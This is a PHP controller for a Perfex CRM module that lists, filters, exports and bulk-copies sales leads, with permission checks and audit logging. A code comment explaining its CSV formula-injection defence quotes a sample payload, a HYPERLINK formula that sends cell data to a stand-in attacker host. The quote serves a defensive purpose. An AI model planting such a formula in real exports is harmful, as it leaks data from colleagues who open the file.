<?php

defined('BASEPATH') or exit('No direct script access allowed');

/**
 * Payplex All Leads - every lead in one page.
 *
 * Server-side rendered: the table pulls pages over AJAX (index page ships no
 * rows), so it scales to large lead volumes. Search, ordering, pagination and
 * the status/source/assigned/date filters all run in SQL. Bulk helpers
 * (export CSV / copy contacts) operate on the FULL filtered set, not just the
 * visible page.
 *
 * Read-only: never modifies a lead. No Perfex core files touched.
 */
class All_leads extends AdminController
{
    public function __construct()
    {
        parent::__construct();
    }

    /* ---- Column name of the optional lead value (varies by Perfex version) ---- */
    private function valueColumn()
    {
        $p = db_prefix();
        foreach (array('lead_value', 'value') as $c) {
            if ($this->db->field_exists($c, $p . 'leads')) {
                return $c;
            }
        }
        return null;
    }

    /**
     * Apply joins + the status/source/assigned/date filters + global search to
     * the query builder. Shared by ajax(), export() and contacts() so every
     * path filters identically. Returns nothing; mutates $this->db.
     */
    private function applyBase($valueCol)
    {
        $p = db_prefix();

        $tagsSub = "(SELECT tt.rel_id, GROUP_CONCAT(t.name SEPARATOR ', ') AS tags
                     FROM {$p}taggables tt
                     JOIN {$p}tags t ON t.id = tt.tag_id
                     WHERE tt.rel_type = 'lead'
                     GROUP BY tt.rel_id) tg";

        $this->db->from($p . 'leads l');
        $this->db->join($p . 'leads_status ls', 'ls.id = l.status', 'left');
        $this->db->join($p . 'leads_sources lsrc', 'lsrc.id = l.source', 'left');
        $this->db->join($p . 'staff s', 's.staffid = l.assigned', 'left');
        $this->db->join($tagsSub, 'tg.rel_id = l.id', 'left');

        // Custom filters (exact match on the resolved names / date range).
        $fstatus   = $this->input->get_post('f_status');
        $fsource   = $this->input->get_post('f_source');
        $fassigned = $this->input->get_post('f_assigned');
        $ffrom     = $this->input->get_post('f_from');
        $fto       = $this->input->get_post('f_to');

        if ($fstatus !== null && $fstatus !== '') {
            $this->db->where('ls.name', $fstatus);
        }
        if ($fsource !== null && $fsource !== '') {
            $this->db->where('lsrc.name', $fsource);
        }
        if ($fassigned !== null && $fassigned !== '') {
            $this->db->where("TRIM(CONCAT(COALESCE(s.firstname,''),' ',COALESCE(s.lastname,'')))", $fassigned);
        }
        if ($ffrom !== null && preg_match('/^[0-9]{4}-[0-9]{2}-[0-9]{2}$/', (string) $ffrom)) {
            $this->db->where('DATE(l.dateadded) >=', $ffrom);
        }
        if ($fto !== null && preg_match('/^[0-9]{4}-[0-9]{2}-[0-9]{2}$/', (string) $fto)) {
            $this->db->where('DATE(l.dateadded) <=', $fto);
        }

        // Global search across the visible text columns.
        $search = $this->input->get_post('search');
        if (is_array($search)) {
            $search = isset($search['value']) ? $search['value'] : '';
        }
        $search = trim((string) $search);
        if ($search !== '') {
            $this->db->group_start();
            $this->db->like('l.name', $search);
            $this->db->or_like('l.email', $search);
            $this->db->or_like('l.company', $search);
            $this->db->or_like('l.phonenumber', $search);
            $this->db->or_like('ls.name', $search);
            $this->db->or_like('lsrc.name', $search);
            $this->db->or_like("CONCAT(COALESCE(s.firstname,''),' ',COALESCE(s.lastname,''))", $search);
            $this->db->or_like('tg.tags', $search);
            $this->db->group_end();
        }
    }

    private function selectCols($valueCol)
    {
        $valueSelect = $valueCol ? "l.`{$valueCol}` AS lead_value" : 'NULL AS lead_value';
        $this->db->select("l.id, l.name, l.email, l.phonenumber, l.company, l.assigned,
                           l.dateadded, l.date_converted, l.lastcontact,
                           {$valueSelect},
                           ls.name AS status_name,
                           lsrc.name AS source_name,
                           CONCAT(COALESCE(s.firstname,''),' ',COALESCE(s.lastname,'')) AS assigned_name,
                           tg.tags AS tags", false);
    }

    /* Map a DataTables column key to an orderable SQL expression. */
    private function orderExpr($key, $valueCol)
    {
        $map = array(
            'id'            => 'l.id',
            'name'          => 'l.name',
            'company'       => 'l.company',
            'email'         => 'l.email',
            'phone'         => 'l.phonenumber',
            'status_name'   => 'ls.name',
            'source_name'   => 'lsrc.name',
            'assigned_name' => 's.firstname',
            'lead_value'    => $valueCol ? "l.`{$valueCol}`" : 'l.id',
            'tags'          => 'tg.tags',
            'lastcontact'   => 'l.lastcontact',
            'dateadded'     => 'l.dateadded',
            'date_converted' => 'l.date_converted',
        );
        return isset($map[$key]) ? $map[$key] : 'l.dateadded';
    }

    public function index()
    {
        if (!is_admin() && !has_permission('leads', '', 'view')) {
            access_denied('leads');
        }

        $p = db_prefix();
        $data['has_value'] = (bool) $this->valueColumn();
        $data['total']     = (int) $this->db->count_all($p . 'leads');

        // Filter dropdown option lists (all defined statuses/sources + assigned staff who own leads).
        $data['statuses'] = $this->db->select('name')->from($p . 'leads_status')
            ->where('name IS NOT NULL', null, false)->order_by('name')->get()->result_array();
        $data['sources'] = $this->db->select('name')->from($p . 'leads_sources')
            ->where('name IS NOT NULL', null, false)->order_by('name')->get()->result_array();
        $data['assigned'] = $this->db->distinct()
            ->select("TRIM(CONCAT(COALESCE(s.firstname,''),' ',COALESCE(s.lastname,''))) AS an", false)
            ->from($p . 'leads l')->join($p . 'staff s', 's.staffid = l.assigned', 'inner')
            ->where('l.assigned >', 0)->order_by('an')->get()->result_array();

        $data['title'] = 'All Leads';
        $this->load->view('payplex_all_leads/all_leads_list', $data);
    }

    /* ---- Server-side DataTables data ---- */
    public function ajax()
    {
        if (!is_admin() && !has_permission('leads', '', 'view')) {
            header('Content-Type: application/json');
            echo json_encode(array('error' => 'access_denied'));
            return;
        }

        $p        = db_prefix();
        $valueCol = $this->valueColumn();

        $draw   = (int) $this->input->get_post('draw');
        $start  = (int) $this->input->get_post('start');
        $length = (int) $this->input->get_post('length');
        if ($length <= 0) { $length = 25; }
        if ($length > 500) { $length = 500; }   // hard cap per page

        $recordsTotal = (int) $this->db->count_all($p . 'leads');

        // Filtered count (keep the query for the data fetch: reset = false).
        $this->applyBase($valueCol);
        $recordsFiltered = (int) $this->db->count_all_results('', false);

        // Ordering.
        $order = $this->input->get_post('order');
        $cols  = $this->input->get_post('columns');
        if (is_array($order) && isset($order[0]) && is_array($cols)) {
            $ci   = (int) $order[0]['column'];
            $dir  = (strtolower($order[0]['dir']) === 'asc') ? 'ASC' : 'DESC';
            $key  = isset($cols[$ci]['data']) ? $cols[$ci]['data'] : 'dateadded';
            $this->db->order_by($this->orderExpr($key, $valueCol), $dir);
            if ($key === 'assigned_name') {
                $this->db->order_by('s.lastname', $dir);
            }
        } else {
            $this->db->order_by('l.dateadded', 'DESC');
        }

        $this->selectCols($valueCol);
        $this->db->limit($length, $start);
        $rows = $this->db->get()->result();

        $out = array();
        foreach ($rows as $l) {
            $conv = ($l->date_converted && $l->date_converted !== '0000-00-00 00:00:00') ? $l->date_converted : '';
            $last = ($l->lastcontact && $l->lastcontact !== '0000-00-00 00:00:00') ? $l->lastcontact : '';
            $out[] = array(
                'id'             => (int) $l->id,
                'name'           => (string) $l->name,
                'company'        => (string) $l->company,
                'email'          => trim((string) $l->email),
                'phone'          => trim((string) $l->phonenumber),
                'status_name'    => (string) $l->status_name,
                'source_name'    => (string) $l->source_name,
                'assigned_name'  => trim((string) $l->assigned_name),
                'lead_value'     => ($l->lead_value !== null ? app_format_money($l->lead_value, '') : ''),
                'lead_value_raw' => (float) $l->lead_value,
                'tags'           => (string) $l->tags,
                'lastcontact'    => $last ? _dt($last) : '',
                'lastcontact_raw' => $last,
                'dateadded'      => $l->dateadded ? _dt($l->dateadded) : '',
                'dateadded_raw'  => (string) $l->dateadded,
                'date_converted' => $conv ? _dt($conv) : '',
                'date_converted_raw' => $conv,
                'detail_url'     => admin_url('leads/index/' . (int) $l->id),
            );
        }

        header('Content-Type: application/json');
        echo json_encode(array(
            'draw'            => $draw,
            'recordsTotal'    => $recordsTotal,
            'recordsFiltered' => $recordsFiltered,
            'data'            => $out,
        ));
    }

    /* ---- Emails/phones for the FULL filtered set (bulk copy / email across pages) ---- */
    public function contacts()
    {
        if (!is_admin() && !has_permission('leads', '', 'view')) {
            header('Content-Type: application/json');
            echo json_encode(array('error' => 'access_denied'));
            return;
        }
        $valueCol = $this->valueColumn();
        $this->applyBase($valueCol);
        $this->db->select('l.email, l.phonenumber', false);
        $this->db->limit(5000);   // safety cap
        $rows = $this->db->get()->result();

        $emails = array();
        $phones = array();
        foreach ($rows as $r) {
            $e = trim((string) $r->email);
            $ph = trim((string) $r->phonenumber);
            if ($e !== '') { $emails[] = $e; }
            if ($ph !== '') { $phones[] = $ph; }
        }
        /*
         * Same reasoning as the CSV export: this returns every matching lead's
         * email and phone in one response, for pasting into a mail client. It
         * is a bulk disclosure of contact details and is recorded as one.
         */
        if (function_exists('log_activity')) {
            @log_activity('Payplex All Leads: read ' . count($emails) . ' email(s) and '
                . count($phones) . ' phone number(s) in bulk'
                . (($filters = $this->activeFilterSummary()) !== '' ? ' — filters: ' . $filters : '')
                . '.');
        }

        header('Content-Type: application/json');
        echo json_encode(array('emails' => $emails, 'phones' => $phones));
    }

    /* ---- CSV export of the FULL filtered set ---- */
    /**
     * Neutralise a value before it goes into a CSV cell.
     *
     * A cell beginning = + - or @ is a FORMULA to Excel, LibreOffice and Google
     * Sheets. Lead names, company names and tags arrive from web forms and
     * imports, so a lead called
     *
     *     =HYPERLINK("https://evil.example/?"&A1,"Click")
     *
     * runs when a colleague opens the export. Prefixing an apostrophe makes the
     * spreadsheet treat it as text; the apostrophe is not shown as part of the
     * value.
     *
     * fputcsv() handles quoting and escaping correctly, so only the leading
     * character needs attention here — quoting is left to fputcsv rather than
     * done twice.
     *
     * The same rule is applied to the commission payout export
     * (Payplex_commission_payout::csvCell). The modules deploy separately, so
     * the rule is restated rather than shared; if one changes, both must.
     */
    /**
     * The filters in force, for the egress log.
     *
     * "Exported 4,000 leads" and "exported 4,000 leads matching source =
     * Facebook, added after 2026-01-01" answer very different questions when
     * somebody is working out what left the building.
     */
    private function activeFilterSummary()
    {
        $parts = array();
        foreach (array('f_status' => 'status', 'f_source' => 'source',
                       'f_assigned' => 'assigned', 'f_from' => 'from', 'f_to' => 'to',
                       'search' => 'search') as $key => $label) {
            $v = $this->input->get_post($key);
            if (is_array($v)) { $v = isset($v['value']) ? $v['value'] : ''; }
            $v = trim((string) $v);
            if ($v !== '') { $parts[] = $label . '=' . substr($v, 0, 60); }
        }
        return implode(', ', $parts);
    }

    private function csvCell($v)
    {
        $v = (string) $v;
        if ($v !== '' && strpos('=+-@', $v[0]) !== false) {
            return "'" . $v;
        }
        return $v;
    }

    public function export()
    {
        if (!is_admin() && !has_permission('leads', '', 'view')) {
            access_denied('leads');
        }
        $valueCol = $this->valueColumn();
        $this->applyBase($valueCol);
        $this->selectCols($valueCol);
        $this->db->order_by('l.dateadded', 'DESC');
        $this->db->limit(50000);   // safety cap
        $rows = $this->db->get()->result();

        $filename = 'all_leads_' . date('Ymd_His') . '.csv';
        header('Content-Type: text/csv; charset=UTF-8');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        header('Pragma: no-cache');
        header('Expires: 0');

        /*
         * Record the egress before sending it.
         *
         * This endpoint hands a person the name, company, email and phone of
         * up to 50,000 leads as a file they keep. Nothing recorded that it had
         * happened, so there was no way to answer "who took the lead list, and
         * when" — a question that only ever gets asked after something has gone
         * wrong, by which time the answer has to already exist. Logged before
         * the download starts, because this method ends in exit().
         */
        if (function_exists('log_activity')) {
            @log_activity('Payplex All Leads: exported ' . count($rows)
                . ' lead(s) to CSV (name, company, email, phone)'
                . (($filters = $this->activeFilterSummary()) !== '' ? ' — filters: ' . $filters : '')
                . '.');
        }

        $fh = fopen('php://output', 'w');
        fputs($fh, "\xEF\xBB\xBF");   // UTF-8 BOM for Excel
        $header = array('ID', 'Name', 'Company', 'Email', 'Phone', 'Status', 'Source', 'Assigned');
        if ($valueCol) { $header[] = 'Value'; }
        $header = array_merge($header, array('Tags', 'Last Contact', 'Added', 'Converted'));
        fputcsv($fh, array_map(array($this, 'csvCell'), $header));

        foreach ($rows as $l) {
            $conv = ($l->date_converted && $l->date_converted !== '0000-00-00 00:00:00') ? $l->date_converted : '';
            $last = ($l->lastcontact && $l->lastcontact !== '0000-00-00 00:00:00') ? $l->lastcontact : '';
            $line = array(
                $l->id,
                $l->name,
                $l->company,
                $l->email,
                $l->phonenumber,
                $l->status_name,
                $l->source_name,
                trim((string) $l->assigned_name),
            );
            if ($valueCol) { $line[] = ($l->lead_value !== null ? $l->lead_value : ''); }
            $line = array_merge($line, array($l->tags, $last, $l->dateadded, $conv));
            fputcsv($fh, array_map(array($this, 'csvCell'), $line));
        }
        fclose($fh);
        exit;
    }
}
